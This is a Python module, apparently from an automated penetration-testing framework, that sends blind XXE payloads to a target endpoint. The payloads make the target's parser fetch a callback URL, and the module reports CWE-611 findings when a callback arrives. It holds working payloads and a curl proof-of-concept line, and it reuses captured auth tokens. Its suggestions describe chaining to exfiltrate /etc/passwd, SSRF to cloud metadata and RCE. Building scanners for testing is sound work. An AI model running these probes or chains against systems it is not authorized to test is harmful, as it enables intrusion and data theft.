"""`scan_oob_xxe` — out-of-band blind XXE specialist
(workitem.md Phase 4.2).

Closes the Juice Shop `deprecated-interface` manifest gap and the
blind half of CWE-611. The existing `scan_xxe` (Phase 6) handles the
in-band case where the resolved entity is reflected in the response.
This specialist covers blind XXE — the parser resolves the external
entity but the response doesn't echo the content back.

Detection model
---------------

Send an XML request with a parameter-entity that fetches a unique
OOB-DNS callback URL. If the parser resolves entities, our OOB
service receives an inbound HTTP request keyed by the embedded
strix-prefixed token; we poll for the hit and emit on success.

Two payload shapes — covers most parser variants:

  1. **Parameter entity (% syntax)**

         <?xml version="1.0"?>
         <!DOCTYPE x [
           <!ENTITY % strix SYSTEM "http://<cb-url>/<token>">
           %strix;
         ]>
         <x>ok</x>

     This is the canonical blind-XXE payload — the parser fetches
     the SYSTEM URL during DTD evaluation. Most permissive parsers
     do this even when entities aren't expanded in the body.

  2. **External-DTD load**

         <?xml version="1.0"?>
         <!DOCTYPE x SYSTEM "http://<cb-url>/<token>.dtd">
         <x>ok</x>

     Loads the entire DTD from the callback URL — the request itself
     is the signal.

Both are sent in series. Either causing an OOB callback hit confirms
blind XXE.

Depends on Phase 1.3 OOB-DNS infrastructure. Returns
`status=partial` with a helpful error when OOB is disabled.

Auto-emits CWE-611 finding on hit. Severity: critical (parser
resolves attacker-controlled URLs → file-read + SSRF chain).
"""

from __future__ import annotations

import logging
from typing import Any

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


def _build_param_entity_payload(callback_url: str) -> str:
    """Parameter-entity (`% strix; %strix;`) blind-XXE probe."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [\n'
        f'  <!ENTITY % strix SYSTEM "{callback_url}">\n'
        '  %strix;\n'
        ']>\n'
        '<foo>strix</foo>\n'
    )


def _build_external_dtd_payload(callback_url: str) -> str:
    """External-DTD-load blind-XXE probe."""
    # Append `.dtd` so the OOB hit is distinguishable from the param
    # entity's hit even when both fire (different paths in the
    # callback URL).
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo SYSTEM "{callback_url}.dtd">\n'
        '<foo>strix</foo>\n'
    )


def _emit_finding(
    *,
    url: str,
    payload_label: str,
    payload: str,
    callback_url: str,
    source_ip: str | None,
    raw_request_excerpt: str,
) -> str | None:
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        finding_id = tracer.add_vulnerability_report(
            title=f"Blind XXE confirmed at `{url}` ({payload_label})",
            severity="critical",
            cwe="CWE-611",
            endpoint=url,
            target=url,
            category="xxe",
            verification_status="verified",
            confidence=0.97,
            description=(
                f"The XML endpoint `{url}` resolves external entities "
                f"declared in attacker-controlled DTDs. Probe "
                f"`{payload_label}` triggered an OOB callback at "
                f"`{callback_url}` from source IP "
                f"`{source_ip or '?'}`, confirming blind XXE — the "
                f"parser fetched our attacker-controlled URL during "
                f"DTD evaluation."
            ),
            impact=(
                "Blind XXE / out-of-band XML external entity. The "
                "parser dereferences attacker-supplied SYSTEM URLs:\n"
                "  * Local-file disclosure — chain a parameter "
                "    entity that reads `/etc/passwd` and exfils via "
                "    a second OOB callback.\n"
                "  * SSRF — fetch internal-only URLs (cloud metadata, "
                "    admin panels) on behalf of the parser host.\n"
                "  * File-write (rare) — some parsers honour `php://` "
                "    style writes when present.\n"
                "  * Pivot to RCE in older Java parsers via the "
                "    `jar:` scheme.\n"
                "Critical because every chain is high-impact and the "
                "parser is reachable from network."
            ),
            technical_analysis=(
                f"Endpoint: {url}\n"
                f"Probe: {payload_label}\n"
                f"Payload sent:\n{payload[:1500]}\n"
                f"OOB callback URL: {callback_url}\n"
                f"Callback hit from source IP: {source_ip or '?'}\n"
                f"Raw OOB request excerpt:\n{raw_request_excerpt[:1500]}"
            ),
            poc_description=(
                f"1. POST the payload above to {url} with "
                f"Content-Type: application/xml.\n"
                f"2. Wait — the parser resolves the external entity "
                f"during DTD evaluation, fetching {callback_url}.\n"
                f"3. The OOB service logs the inbound request — that's "
                f"the confirmation. Pivot to file-read with a chained "
                f"parameter-entity payload that exfils file content "
                f"via a second callback."
            ),
            poc_script_code=(
                f"curl -sS -X POST '{url}' "
                f"-H 'Content-Type: application/xml' "
                f"--data-binary @blind_xxe_payload.xml"
            ),
            remediation_steps=(
                "1. Disable external-entity resolution in the XML "
                "parser. Per language:\n"
                "     Java: dbf.setFeature("
                "\"http://apache.org/xml/features/disallow-doctype-decl\","
                " true)\n"
                "     Python: defusedxml (drop-in replacement for "
                "stdlib xml).\n"
                "     PHP: libxml_disable_entity_loader(true) (PHP <8); "
                "PHP 8+ disables external entities by default.\n"
                "     .NET: XmlReaderSettings.DtdProcessing = "
                "DtdProcessing.Prohibit\n"
                "2. Reject any request body containing `<!DOCTYPE` or "
                "`<!ENTITY` at the application layer (defence in "
                "depth).\n"
                "3. Egress firewall: block outbound connections from "
                "the application server to the public internet — XXE "
                "OOB chains rely on the parser reaching the attacker."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "C", "C": "H", "I": "L", "A": "L",
            },
            reasoning_trace=[
                f"POST blind-XXE probe `{payload_label}` to {url}.",
                f"Embedded OOB callback URL: {callback_url}.",
                f"OOB service received inbound request from {source_ip}.",
                "Parser fetched attacker-controlled URL during DTD "
                "evaluation → CWE-611 confirmed.",
            ],
        )
        try:
            from strix.agents.kg_emit import record_finding_in_kg
            record_finding_in_kg(
                finding_id=finding_id, url=url, param="xml_body",
                cwe="CWE-611", severity="critical", category="xxe",
                method="POST", detection_kind=f"oob_{payload_label[:50]}",
                confidence=0.97,
            )
        except Exception as e:  # noqa: BLE001
            logger.debug("scan_oob_xxe: kg record failed: %s", e, exc_info=True)
        return finding_id
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_oob_xxe: emit failed: %s", e, exc_info=True)
        return None


@register_specialist_tool(
    category="xxe-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 60},
    sandbox_execution=False,
    provenance="framework",
    mitre_techniques=["T1190"],
)
def scan_oob_xxe(
    *,
    url: str,
    extra_headers: dict[str, str] | None = None,
    oob_timeout_seconds: float = 10.0,
) -> SpecialistResult:
    """Out-of-band blind XXE scanner. Sends parameter-entity +
    external-DTD probes embedding a unique OOB callback URL; emits a
    CWE-611 critical finding when the OOB service receives an
    inbound request.

    Args:
        url: target XML-accepting endpoint (POST).
        extra_headers: forwarded as-is. Content-Type defaults to
            `application/xml`.
        oob_timeout_seconds: how long to wait per probe for the OOB
            callback to fire. Default 10s — most parsers fetch the
            DTD synchronously during the request, so 5-15s is
            usually sufficient.

    Returns:
        SpecialistResult. `status=partial` when OOB-DNS is unavailable
        (Phase 1.3 not deployed). Auto-emits one finding per probe
        that triggers a callback.
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    # OOB precondition.
    try:
        from strix.tools.oob import (
            backend_name as oob_backend_name,
            is_available as oob_is_available,
            poll_callback,
            register_callback,
        )
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"OOB module unavailable: {type(e).__name__}: {e}",
        )

    if not oob_is_available():
        return SpecialistResult(
            status="partial",
            error=(
                "OOB-DNS backend not available — Phase 1.3 prerequisite. "
                "Set STRIX_OOB_BACKEND=local or interactsh, or run on a "
                "host where interactsh-client is on PATH."
            ),
            evidence=[f"backend: {oob_backend_name()}"],
            next_probes_suggested=[
                "deploy OOB-DNS infra (Phase 1.3) then retry; meanwhile "
                "scan_xxe (Phase 6) covers the in-band case"
            ],
        )

    # Auto-include captured auth.
    extra_headers = dict(extra_headers or {})
    extra_headers.setdefault("Content-Type", "application/xml")
    if "Authorization" not in extra_headers and "authorization" not in {
        h.lower() for h in extra_headers
    }:
        try:
            from strix.agents.security_context import list_auth_states
            for state in list_auth_states():
                if state.bearer:
                    extra_headers["Authorization"] = f"Bearer {state.bearer}"
                    break
                if state.cookies:
                    extra_headers["Cookie"] = "; ".join(
                        f"{k}={v}" for k, v in state.cookies.items()
                    )
                    break
        except Exception:  # noqa: BLE001
            pass

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager
        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0

    probes: list[tuple[str, callable]] = [
        ("param_entity", _build_param_entity_payload),
        ("external_dtd", _build_external_dtd_payload),
    ]

    for label, builder in probes:
        cb = register_callback(ttl_seconds=int(oob_timeout_seconds * 4))
        if cb is None:
            evidence.append(f"{label}: register_callback returned None")
            continue
        payload = builder(cb.callback_url)
        try:
            pm.send_simple_request(
                "POST", url,
                headers=extra_headers, body=payload, timeout=15,
            )
            probe_count += 1
        except Exception as e:  # noqa: BLE001
            evidence.append(f"{label}: transport error: {e}")
            continue
        # Poll for the callback.
        result = poll_callback(cb.token, timeout_seconds=oob_timeout_seconds)
        if not result.get("hit"):
            evidence.append(
                f"{label}: no callback within {oob_timeout_seconds}s"
            )
            continue

        rid = _emit_finding(
            url=url, payload_label=label, payload=payload,
            callback_url=cb.callback_url,
            source_ip=result.get("source_ip"),
            raw_request_excerpt=str(result.get("raw_request") or "")[:1500],
        )
        if rid:
            emitted_count += 1
        drafts.append(FindingDraft(
            title=f"Blind XXE at `{url}` ({label})",
            severity="critical", cwe="CWE-611",
            endpoint=url, category="xxe",
            verification_status="verified", confidence=0.97,
            description=(
                f"OOB callback hit from "
                f"{result.get('source_ip','?')} via {label}"
            ),
        ))
        evidence.append(
            f"{label}: OOB hit from {result.get('source_ip','?')} "
            f"(token {cb.token})"
        )

    # SecurityContext + decision_log
    try:
        from strix.agents.security_context import record_endpoint
        record_endpoint(url, method="POST", probed_for="oob_xxe")
    except Exception:  # noqa: BLE001
        pass
    try:
        from strix.agents.decision_log import record_decision
        record_decision(
            kind="specialist_invocation", target=url,
            actor={"tool_name": "scan_oob_xxe"},
            input={
                "oob_backend": oob_backend_name(),
                "probes_sent": probe_count,
            },
            output={
                "findings_emitted": emitted_count,
                "drafts": len(drafts),
            },
        )
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            ["confirm with chained parameter-entity that exfils "
             "/etc/passwd content via a SECOND OOB callback (full file-"
             "read primitive); pivot to internal SSRF via parser-host "
             "egress"]
            if drafts else
            ["no blind XXE confirmed via OOB; verify the endpoint "
             "actually accepts XML (Content-Type sniffing, SOAP "
             "envelope shape), and that the OOB-DNS backend is reachable "
             "from the target's egress"]
        ),
        tool_metadata={
            "probes_sent": probe_count,
            "oob_backend": oob_backend_name(),
            "findings_emitted_to_tracer": emitted_count,
        },
    )
